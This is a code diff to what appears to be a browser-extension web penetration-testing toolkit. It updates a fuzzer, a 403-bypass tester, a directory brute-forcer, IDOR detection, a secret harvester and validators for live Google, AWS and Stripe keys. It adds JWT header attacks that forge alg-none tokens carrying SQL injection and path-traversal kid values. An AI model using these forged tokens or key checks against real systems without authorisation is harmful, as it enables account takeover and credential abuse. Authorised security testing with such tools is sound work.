           ${x.context ? `<div style="margin-top:4px;padding:4px 6px;background:${x.severity==='high'?'var(--danger-soft)':'var(--surface-hover)'};border-radius:3px;font-family:var(--font-mono);font-size:9px;word-break:break-all;max-height:70px;overflow:auto">${esc(x.context)}</div>` : ''}
           ${x.errorBody ? `<div style="margin-top:4px;padding:4px 6px;background:var(--danger-soft);border-radius:3px;font-family:var(--font-mono);font-size:9px;word-break:break-all;max-height:80px;overflow:auto"><strong>Error response:</strong><br>${esc(x.errorBody.slice(0,400))}</div>` : ''}
         </div>`;
-      }).join('');
-    finalizeResults('offensive');
-    log(`Fuzz: ${critical.length} critical, ${warnings.length} warnings (${cat})`, critical.length ? 'warn' : 'success');
-  }));
+      }).join('') || '<div class="text-muted text-sm">No results in this filter</div>';
+    };
+    renderList('all');
+    out.querySelector('#fz-show-all')?.addEventListener('click', () => renderList('all'));
+    out.querySelector('#fz-show-vuln')?.addEventListener('click', () => renderList('vuln'));
+    out.querySelector('#fz-show-safe')?.addEventListener('click', () => renderList('safe'));
+    log(`Fuzz: ${critical.length} critical, ${warnings.length} warnings`, critical.length ? 'warn' : 'success');
+  };
+
+  // Mode switching
+  b.querySelector('#fz-mode-url').addEventListener('click', () => {
+    b.querySelector('#fz-mode-url').classList.add('primary');
+    b.querySelector('#fz-mode-form').classList.remove('primary');
+    renderUrlMode();
+  });
+  b.querySelector('#fz-mode-form').addEventListener('click', () => {
+    b.querySelector('#fz-mode-form').classList.add('primary');
+    b.querySelector('#fz-mode-url').classList.remove('primary');
+    renderFormMode();
+  });
+
+  // Default: show URL mode if params exist, otherwise form mode
+  if (params.length) renderUrlMode();
+  else if (pageForms.length) { b.querySelector('#fz-mode-form').classList.add('primary'); b.querySelector('#fz-mode-url').classList.remove('primary'); renderFormMode(); }
+  else renderUrlMode();
 }
 
 // ═══ JS BEAUTIFIER ═══
@@ -1443,14 +1710,21 @@ async function toolJsBeautify() {
 }
 
 function jsBeautify(code) {
-  // Simple but effective JS beautifier
   let out = '', indent = 0, inStr = false, strChar = '', escaped = false;
+  let inLineComment = false, inBlockComment = false;
   const addNewline = () => { out += '\n' + '  '.repeat(Math.max(0, indent)); };
   for (let i = 0; i < code.length; i++) {
     const c = code[i], prev = code[i - 1], next = code[i + 1];
+    // Line comments
+    if (!inStr && !inBlockComment && c === '/' && next === '/') { inLineComment = true; out += c; continue; }
+    if (inLineComment) { out += c; if (c === '\n') inLineComment = false; continue; }
+    // Block comments
+    if (!inStr && !inLineComment && c === '/' && next === '*') { inBlockComment = true; out += c; continue; }
+    if (inBlockComment) { out += c; if (c === '*' && next === '/') { out += '/'; i++; inBlockComment = false; } continue; }
     if (escaped) { out += c; escaped = false; continue; }
     if (c === '\\') { out += c; escaped = true; continue; }
-    if (inStr) { out += c; if (c === strChar) inStr = false; continue; }
+    if (inStr) { out += c; if (c === strChar && strChar !== '`') inStr = false;
+      if (strChar === '`' && c === '`') inStr = false; continue; }
     if (c === '"' || c === "'" || c === '`') { out += c; inStr = true; strChar = c; continue; }
     if (c === '{' || c === '[') { out += c; indent++; addNewline(); continue; }
     if (c === '}' || c === ']') { indent--; addNewline(); out += c; continue; }
@@ -1563,9 +1837,12 @@ async function toolTakeover() {
   }
   const vulns = r.results.filter(x => x.vulnerable);
   b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} CNAME matches, <span class="${vulns.length?'text-accent':'text-muted'}" style="font-weight:700">${vulns.length} potentially vulnerable</span></span></div>` +
-    r.results.map(x => `<div class="result-item ${x.vulnerable ? 'high' : 'low'}">
-      <div class="result-label"><span class="result-tag ${x.vulnerable ? 'tag-high' : 'tag-low'}">${x.vulnerable ? 'VULN' : 'OK'}</span>${esc(x.service)}</div>
+    r.results.map(x => `<div class="result-item ${x.vulnerable ? 'high' : x.errorType === 'CONNECTION_REFUSED' ? 'medium' : 'low'}">
+      <div class="result-label"><span class="result-tag ${x.vulnerable ? 'tag-high' : x.errorType === 'CONNECTION_REFUSED' ? 'tag-medium' : 'tag-low'}">${x.vulnerable ? 'VULN' : x.errorType || 'OK'}</span>${esc(x.service)}</div>
       <div class="result-value">${esc(x.subdomain)} → ${esc(x.cname)}</div>
+      ${x.errorType === 'CONNECTION_REFUSED' ? '<div class="text-xs" style="color:var(--warning)">Connection refused — moderate takeover signal, verify manually</div>' : ''}
+      ${x.errorType === 'TIMEOUT' ? '<div class="text-xs text-muted">Timeout — weak signal, likely not takeover</div>' : ''}
+      ${x.errorType === 'DNS_NXDOMAIN' ? '<div class="text-xs text-accent">DNS does not resolve — strong takeover signal!</div>' : ''}
     </div>`).join('');
   finalizeResults('discovery');
   log(`Takeover: ${vulns.length} vulnerable of ${r.results.length} checked`, vulns.length ? 'warn' : 'success');
@@ -1585,7 +1862,9 @@ async function tool403Bypass() {
       r.results.filter(x=>x.type!=='baseline').map(x => `<div class="result-item ${x.bypass?'high':x.status===200?'medium':'info'}">
         <div class="result-label"><span class="result-tag ${x.bypass?'tag-high':'tag-info'}">${x.status}</span> ${esc(x.type)}</div>
         <div class="result-value">${esc(x.technique)}</div>
-        ${x.bypass?'<div class="text-xs text-accent" style="font-weight:600">⚠ BYPASS — got '+x.status+' instead of '+r.baseStatus+'!</div>':''}
+        ${x.bypass?'<div class="text-xs text-accent" style="font-weight:600">BYPASS — got '+x.status+' instead of '+r.baseStatus+'!</div>':''}
+        ${x.verdict?`<div class="text-xs text-muted">${esc(x.verdict)}</div>`:''}
+        ${x.preview?`<div style="margin-top:4px;padding:4px 6px;background:var(--danger-soft);border-radius:3px;font-family:var(--font-mono);font-size:9px;max-height:60px;overflow:auto">${esc(x.preview.slice(0,200))}</div>`:''}
       </div>`).join('');
     finalizeResults('offensive');
     log(`403 bypass: ${bypasses.length} found`, bypasses.length ? 'warn' : 'success');
@@ -1604,8 +1883,9 @@ async function toolMethodTest() {
       let sev = 'info', verdict = '';
       if (x.error) { sev = 'info'; verdict = x.error; }
       else if (x.baseline) { verdict = 'Baseline reference'; }
-      else if (x.realDanger) { sev = 'high'; verdict = `⚠ ${x.method} returns DIFFERENT response (${x.bodyDiff}b diff) — likely processed! Investigate.`; }
-      else if (x.fakeAccept) { sev = 'info'; verdict = `Same page as GET (±${x.bodyDiff}b) — server ignores method, not a real finding`; }
+      else if (x.traceEcho) { sev = 'high'; verdict = 'TRACE echoes request headers back — XST (Cross-Site Tracing) possible!'; }
+      else if (x.realDanger) { sev = 'high'; verdict = `${x.method} returns DIFFERENT response (${x.bodyDiff}b diff) — likely processed! Investigate.`; }
+      else if (x.fakeAccept) { sev = 'info'; verdict = `Same page as GET (${x.bodyDiff}b) — server ignores method, not a real finding`; }
       else if (x.status === 405) { verdict = 'Method not allowed (expected)'; }
       else if (x.status !== baseline.status) { sev = 'low'; verdict = `Different status than GET (${baseline.status})  — worth investigating`; }
       else { verdict = 'Same as GET'; }
@@ -1648,12 +1928,15 @@ function toolJwtEditor() {
       const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
       const expiry = payload.exp ? new Date(payload.exp * 1000).toISOString() : 'none';
       const expired = payload.exp ? payload.exp * 1000 < Date.now() : false;
+      const expiryDays = payload.exp ? Math.floor((payload.exp * 1000 - Date.now()) / 86400000) : null;
+      const expiryText = expired ? `EXPIRED ${Math.abs(expiryDays)} days ago` : expiryDays !== null ? `Valid for ${expiryDays} more days` : 'No expiry set';
+      const hasKid = header.kid !== undefined;
 
       const authClaims = ['role','admin','is_admin','is_staff','permissions','groups','scope','aud','tenant_id','user_id','userId','uid','email','username'];
       const flaggedClaims = Object.keys(payload).filter(k => authClaims.includes(k));
 
-      out.innerHTML = `<div class="result-item ${expired?'medium':'info'}"><div class="result-label">Header (alg: ${esc(header.alg)})</div><div class="result-value"><pre style="white-space:pre-wrap">${esc(JSON.stringify(header,null,2))}</pre></div></div>
-        <div class="result-item info"><div class="result-label">Payload${expired?' — EXPIRED':''}</div><div class="result-value"><pre style="white-space:pre-wrap">${esc(JSON.stringify(payload,null,2))}</pre></div><div class="text-xs text-muted">Expires: ${expiry}</div></div>
+      out.innerHTML = `<div class="result-item ${expired?'medium':'info'}"><div class="result-label">Header (alg: ${esc(header.alg)}${hasKid ? ' | kid: ' + esc(String(header.kid)) : ''})</div><div class="result-value"><pre style="white-space:pre-wrap">${esc(JSON.stringify(header,null,2))}</pre></div>${hasKid ? '<div class="text-xs" style="color:var(--warning)">kid header present — try kid injection payloads below</div>' : ''}</div>
+        <div class="result-item ${expired?'high':'info'}"><div class="result-label">Payload — <span style="color:${expired?'var(--danger)':'var(--success)'}; font-weight:700">${expiryText}</span></div><div class="result-value"><pre style="white-space:pre-wrap">${esc(JSON.stringify(payload,null,2))}</pre></div><div class="text-xs text-muted">Expires: ${expiry}</div></div>
         ${flaggedClaims.length ? `<div class="result-item medium"><div class="result-label">🎯 Auth Claims Detected</div><div class="result-value">${flaggedClaims.map(k => `<strong>${esc(k)}</strong>: ${esc(String(payload[k]))}`).join(' · ')}</div><div class="text-xs" style="color:var(--warning)">These control authorization — modify with quick edits below</div></div>` : ''}
         <div class="result-label mt-6 mb-4">Edit & Re-encode</div>
         <textarea class="tool-input mb-4" id="jwt-edit" rows="6" style="font-size:10px">${esc(JSON.stringify(payload,null,2))}</textarea>
@@ -1669,6 +1952,12 @@ function toolJwtEditor() {
           <button class="btn-sm jwt-qe" data-qe="uid1">user_id→1</button>
           <button class="btn-sm jwt-qe" data-qe="expiry">+1yr expiry</button>
           <button class="btn-sm jwt-qe" data-qe="email">email→admin@</button>
+        </div>
+        <div class="result-label mt-4 mb-4">Header Attacks</div>
+        <div class="codec-row mb-4">
+          <button class="btn-sm jwt-he" data-he="kid-sqli">kid SQL injection</button>
+          <button class="btn-sm jwt-he" data-he="kid-path">kid path traversal</button>
+          <button class="btn-sm jwt-he" data-he="kid-empty">kid empty string</button>
         </div>
         <textarea class="tool-input mt-6" id="jwt-result" rows="2" readonly placeholder="Modified token…"></textarea>`;
 
@@ -1709,6 +1998,22 @@ function toolJwtEditor() {
           out.querySelector('#jwt-result').value = token;
         } catch (e) { out.querySelector('#jwt-result').value = 'Error: ' + e.message; }
       });
+      // Header attack handlers
+      out.querySelectorAll('.jwt-he').forEach(btn => btn.addEventListener('click', () => {
+        try {
+          const newPayload = JSON.parse(out.querySelector('#jwt-edit').value);
+          const newHeader = { ...header };
+          switch (btn.dataset.he) {
+            case 'kid-sqli': newHeader.kid = "' UNION SELECT 'secret' --"; break;
+            case 'kid-path': newHeader.kid = '../../../../dev/null'; break;
+            case 'kid-empty': newHeader.kid = ''; break;
+          }
+          newHeader.alg = 'none';
+          const token = b64url(JSON.stringify(newHeader)) + '.' + b64url(JSON.stringify(newPayload)) + '.';
+          out.querySelector('#jwt-result').value = token;
+          log('JWT header attack: ' + btn.dataset.he, 'info');
+        } catch (e) { out.querySelector('#jwt-result').value = 'Error: ' + e.message; }
+      }));
       out.querySelector('#jwt-resign')?.addEventListener('click', () => {
         try {
           const newPayload = JSON.parse(out.querySelector('#jwt-edit').value);
@@ -1764,8 +2069,8 @@ async function toolDirBrute() {
     if (!r.results.length) { out.innerHTML = `<div class="text-muted text-sm">Nothing found across ${r.total} paths</div>`; finalizeResults('discovery'); return; }
     out.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} found / ${r.total} tested</span></div>` +
       r.results.map(x => {
-        const sev = x.status === 200 ? 'high' : x.status === 403 || x.status === 401 ? 'medium' : 'low';
-        const statusLabel = x.status === 200 ? 'OPEN' : x.status === 403 ? 'FORBIDDEN' : x.status === 401 ? 'AUTH REQ' : x.status;
+        const sev = x.isRedirectCatchall ? 'info' : x.status === 200 ? 'high' : x.status === 403 || x.status === 401 ? 'medium' : 'low';
+        const statusLabel = x.isRedirectCatchall ? 'REDIR' : x.status === 200 ? 'OPEN' : x.status === 403 ? 'FORBIDDEN' : x.status === 401 ? 'AUTH REQ' : x.status;
         const fullUrl = new URL(activeTabUrl).origin + x.path;
         return `<div class="result-item ${sev}" style="cursor:pointer">
           <div class="result-label"><span class="result-tag tag-${sev}">${statusLabel}</span> <a href="${esc(fullUrl)}" target="_blank" style="color:var(--accent);text-decoration:none">${esc(x.path)}</a></div>
@@ -1809,9 +2114,11 @@ async function toolIdor() {
   const seen = new Set();
 
   // Params that are NEVER IDOR candidates
-  const ignoreParams = /^(sentry_|utm_|_ga|gclid|fbclid|dclid|msclkid|__cf|__utm|_gid|_gcl|gtm_|mc_|yclid|twclid|li_|ref|locale|lang|page|per_page|limit|offset|sort|order|format|callback|v|ver|version|t|timestamp|ts|nonce|rand|cache|_$|__)/i;
+  const ignoreParams = /^(sentry_|utm_|_ga|gclid|fbclid|dclid|msclkid|__cf|__utm|_gid|_gcl|gtm_|mc_|yclid|twclid|li_|ref|locale|lang|page|per_page|limit|offset|sort|order|format|callback|v|ver|version|t|timestamp|ts|nonce|rand|cache|_$|__|width|height|size|w|h|quality|q|dpr|fit|crop|count|quantity|zip|postal|lat|lng|lon|latitude|longitude)/i;
   const ignoreHosts = /sentry\.io|google-analytics|analytics|doubleclick|facebook\.com|googletagmanager|hotjar|clarity\.ms|newrelic|datadog/i;
   const idorPathHints = /users?|orders?|accounts?|profiles?|invoices?|tickets?|messages?|posts?|comments?|products?|items?|documents?|files?|reports?|transactions?|payments?|pantanir|notendur|vidskiptavinir|customers?|bookings?|reservations?/i;
+  // Paths where IDs are rarely IDOR-relevant
+  const ignorePathContexts = /static|assets|images?|img|css|js|fonts?|media|uploads?|cdn|public|dist|build|bundle|vendor|node_modules|\.min\.|\.map$/i;
 
   const analyzeUrl = (urlStr, source) => {
     try {
@@ -1831,6 +2138,8 @@ async function toolIdor() {
       });
       // Path segments with context
       const segments = u.pathname.split('/').filter(Boolean);
+      // Skip static asset paths entirely
+      if (ignorePathContexts.test(u.pathname)) return;
       segments.forEach((seg, i) => {
         const key = 'path:' + seg;
         if (seen.has(key)) return; seen.add(key);
@@ -1929,16 +2238,21 @@ async function liveScanPage(tabId, url, title) {
   feed.prepend(scanDiv);
 
   const newItems = [];
+  let cachedScripts = null;
   try {
+    // 1. Get scripts once, reuse for secrets + endpoints
+    try {
+      cachedScripts = await chrome.tabs.sendMessage(tabId, { type: 'GET_SCRIPT_URLS' });
+    } catch {}
+
     // 1. Secrets
     try {
-      const sr = await chrome.tabs.sendMessage(tabId, { type: 'GET_SCRIPT_URLS' });
-      if (sr?.ok) {
+      if (cachedScripts?.ok) {
         const findings = [];
-        for (const jsUrl of sr.data.external.slice(0, 10)) {
+        for (const jsUrl of cachedScripts.data.external.slice(0, 10)) {
           try { const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url: jsUrl }); if (r.ok) scanSecrets(r.text, jsUrl, findings); } catch {}
         }
-        sr.data.inline.slice(0, 5).forEach((txt, i) => scanSecrets(txt, '[inline]', findings));
+        cachedScripts.data.inline.slice(0, 5).forEach((txt, i) => scanSecrets(txt, '[inline]', findings));
         findings.forEach(f => {
           const key = 'secret:' + f.match;
           if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'secrets', icon: '🔑', text: `[${f.severity}] ${f.name}: ${f.match.slice(0, 60)}` }); }
@@ -1946,14 +2260,13 @@ async function liveScanPage(tabId, url, title) {
       }
     } catch {}
 
-    // 2. Endpoints
+    // 2. Endpoints (reuse cachedScripts)
     try {
-      const sr = await chrome.tabs.sendMessage(tabId, { type: 'GET_SCRIPT_URLS' });
-      if (sr?.ok) {
+      if (cachedScripts?.ok) {
         const eps = new Set();
         const proc = t => { for (const p of ENDPOINT_PATTERNS) { const re = new RegExp(p.source, p.flags); let m; while ((m = re.exec(t)) !== null) { const ep = m[1] || m[0]; if (isRealEndpoint(ep)) eps.add(ep); } } };
-        for (const u of sr.data.external.slice(0, 8)) { try { const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url: u }); if (r.ok) proc(r.text); } catch {} }
-        sr.data.inline.forEach(proc);
+        for (const u of cachedScripts.data.external.slice(0, 8)) { try { const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url: u }); if (r.ok) proc(r.text); } catch {} }
+        cachedScripts.data.inline.forEach(proc);
         eps.forEach(ep => {
           const key = 'ep:' + ep;
           if (!liveSeenItems.has(key)) { liveSeenItems.add(key); newItems.push({ type: 'endpoints', icon: '🔗', text: ep }); }
@@ -2024,9 +2337,8 @@ async function liveScanPage(tabId, url, title) {
 
     // 8. Source maps (.js.map files)
     try {
-      const sr = await chrome.tabs.sendMessage(tabId, { type: 'GET_SCRIPT_URLS' });
-      if (sr?.ok) {
-        for (const jsUrl of sr.data.external.slice(0, 5)) {
+      if (cachedScripts?.ok) {
+        for (const jsUrl of cachedScripts.data.external.slice(0, 5)) {
           const mapUrl = jsUrl + '.map';
           const key = 'srcmap:' + mapUrl;
           if (!liveSeenItems.has(key)) {
@@ -2065,25 +2377,55 @@ async function liveScanPage(tabId, url, title) {
 window.testGoogleKey = async function(key) {
   log('Testing Google API key…');
   try {
-    const r = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?key=${key}&address=test`);
-    const d = await r.json();
-    if (d.status === 'OK' || d.status === 'ZERO_RESULTS') {
-      log('⚠ Google API key is ACTIVE and unrestricted!', 'warn');
-      alert('⚠ KEY IS LIVE!\n\nThis Google API key is active and unrestricted.\nThis is a confirmed vulnerability — report it.');
-    } else if (d.error_message?.includes('API key')) {
-      log('Google key restricted or invalid: ' + d.status, 'success');
-      alert('Key is restricted or invalid: ' + d.status + '\n' + (d.error_message || ''));
-    } else {
-      log('Google key status: ' + d.status);
-      alert('Key status: ' + d.status);
-    }
+    const r = await chrome.runtime.sendMessage({ type: 'TEST_GOOGLE_KEY', key });
+    if (r.ok) {
+      if (r.status === 'OK' || r.status === 'ZERO_RESULTS') {
+        log('Google API key is ACTIVE and unrestricted!', 'warn');
+        alert('KEY IS LIVE!\n\nThis Google API key is active and unrestricted.\nThis is a confirmed vulnerability — report it.');
+      } else {
+        log('Google key restricted or invalid: ' + r.status, 'success');
+        alert('Key status: ' + r.status + '\n' + (r.error_message || ''));
+      }
+    } else { log('Key test failed: ' + r.error, 'error'); }
   } catch (e) { log('Key test failed: ' + e.message, 'error'); }
+};
+
+window.testAwsKey = async function(key) {
+  log('Testing AWS key…');
+  try {
+    const r = await chrome.runtime.sendMessage({ type: 'TEST_AWS_KEY', key });
+    if (r.ok) {
+      if (r.valid) {
+        log('AWS key appears ACTIVE!', 'warn');
+        alert('AWS KEY MAY BE LIVE!\n\nThe key returned a non-403 response from STS.\nManual verification recommended with aws-cli.');
+      } else {
+        log('AWS key returned ' + r.status + ' — likely invalid or restricted', 'success');
+        alert('AWS key status: HTTP ' + r.status + '\nLikely invalid or restricted.');
+      }
+    } else { log('AWS test failed: ' + r.error, 'error'); }
+  } catch (e) { log('AWS test failed: ' + e.message, 'error'); }
+};
+
+window.testStripeKey = async function(key) {
+  log('Testing Stripe key…');
+  try {
+    const r = await chrome.runtime.sendMessage({ type: 'TEST_STRIPE_KEY', key });
+    if (r.ok) {
+      if (r.valid) {
+        log('Stripe key is ACTIVE!', 'warn');
+        alert('STRIPE KEY IS LIVE!\n\nThis secret key is active and can access the Stripe API.\nThis is a confirmed vulnerability — report it.');
+      } else {
+        log('Stripe key returned ' + r.status + ' — invalid or restricted', 'success');
+        alert('Stripe key status: HTTP ' + r.status + '\nInvalid or restricted.');
+      }
+    } else { log('Stripe test failed: ' + r.error, 'error'); }
+  } catch (e) { log('Stripe test failed: ' + e.message, 'error'); }
 };
 
 // ═══ HELPERS ═══
 function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=String(s);return d.innerHTML}
 function errMsg(e){return`<div class="result-item high"><div class="result-value">${esc(typeof e==='string'?e:e?.message||'Unknown error')}</div></div>`}
-function getRootDomain(h){if(!h)return'';const p=h.split('.');return p.length<=2?h:p.slice(-2).join('.')}
+function getRootDomain(h){if(!h)return'';const p=h.split('.');if(p.length<=2)return h;const multiTLDs=['co.uk','co.jp','co.kr','co.nz','co.za','co.in','co.id','co.il','com.au','com.br','com.cn','com.mx','com.sg','com.tr','com.tw','com.hk','org.uk','org.au','net.au','ac.uk','gov.uk','gov.au','edu.au','ne.jp','or.jp','ac.jp','go.jp'];const last2=p.slice(-2).join('.');if(multiTLDs.includes(last2)&&p.length>2)return p.slice(-3).join('.');return p.slice(-2).join('.')}
 function copyText(t){navigator.clipboard.writeText(t).then(()=>{const e=document.getElementById('copy-toast');e.classList.add('show');setTimeout(()=>e.classList.remove('show'),1200)}).catch(()=>log('Copy failed','error'))}
 function downloadText(t,f){const b=new Blob([t],{type:'text/plain'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=f;a.click();URL.revokeObjectURL(u)}
 function log(msg,level='info'){const el=document.getElementById('debug-log-entries');const e=document.createElement('div');e.className='log-entry '+(level||'');e.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`;el.appendChild(e);el.scrollTop=el.scrollHeight;while(el.children.length>100)el.removeChild(el.firstChild)}
